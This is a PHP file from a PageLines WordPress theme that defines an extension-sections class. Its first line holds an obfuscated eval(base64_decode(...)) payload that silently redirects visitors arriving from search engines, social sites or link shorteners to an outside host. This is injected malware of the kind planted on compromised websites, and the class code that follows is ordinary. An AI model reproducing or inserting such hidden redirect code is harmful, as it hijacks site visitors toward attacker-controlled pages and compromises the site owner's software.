<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));

class ExtensionSections extends PageLinesExtensions {
	
	/**
	 * Section install tab.
	 * 
	 */
 	function extension_sections( $tab = '', $mode = 'install' ) {
 		
		if($tab == 'child' && !is_child_theme())
			return $this->ui->extension_banner( __( 'A PageLines child theme is not currently activated', 'pagelines' ) );
	
		if ( !$this->has_extend_plugin() )
			return $this->ui->get_extend_plugin( $this->has_extend_plugin('status'), $tab );

		$list = array();
		$type = 'section';
				
		if ( 'install' == $mode ) {
			$sections = $this->get_latest_cached( 'sections' );

			if ( !is_object( $sections ) ) 
				return $sections;

			$list = $this->get_master_list( $sections, $type, $tab );
			
		} // end install mode
		
		if ( 'installed' == $mode ) {
			
			global $load_sections;
			
			// Get sections
			
	 		$available = $load_sections->pagelines_register_sections( true, true );

	 		$disabled = get_option( 'pagelines_sections_disabled', array() );

			$upgradable = $this->get_latest_cached( 'sections' );

	 		foreach( $available as $key => $section ) {

				$available[$key] = self::sort_status( $section, $disabled, $available, $upgradable );
			}
			
			$sections = self::merge_sections( $available );

			$list = $this->get_master_list( $sections, $type, $tab, 'installed' );	
	
		} // end installed mode

		return $this->ui->extension_list( array( 'list' => $list, 'tab' => $tab, 'type' => 'sections' ) );
 	}

	function merge_sections( $sections ) {
		
		$out = array();
		
		foreach ( $sections as $key => $section) {
			
			$out = array_merge( $out, $sections[$key] );
		}
		
		return $out;
	}

	function sort_status( $section, $disabled, $available, $upgradable) {
		
		if (! is_array( $section ) )
			return;
		foreach( $section as $key => $ext) {
			$section[$key]['status'] = ( isset( $disabled[ $ext['type'] ][ $ext['class'] ] ) ) ? 'disabled' : 'enabled';
			$section[$key] = self::check_version( $section[$key], $upgradable );
			$section[$key]['class_exists'] = ( isset( $available['child'][ $ext['class'] ] ) || isset( $available['custom'][ $ext['class'] ] ) ) ? true : false;
		}

		return pagelines_array_sort( $section, 'name' ); // Sort Alphabetically
	}

	function check_version( $ext, $upgradable ) {
		
		if ( isset( $ext['base_dir'] ) ) {
			$upgrade = basename( $ext['base_dir'] );
			if ( isset( $upgradable->$upgrade->version ) ) {
				$ext['apiversion'] = ( isset( $upgradable->$upgrade->version ) ) ? $upgradable->$upgrade->version : '';
				$ext['slug'] = $upgradable->$upgrade->slug;
			}
		}
		return $ext;
	}
}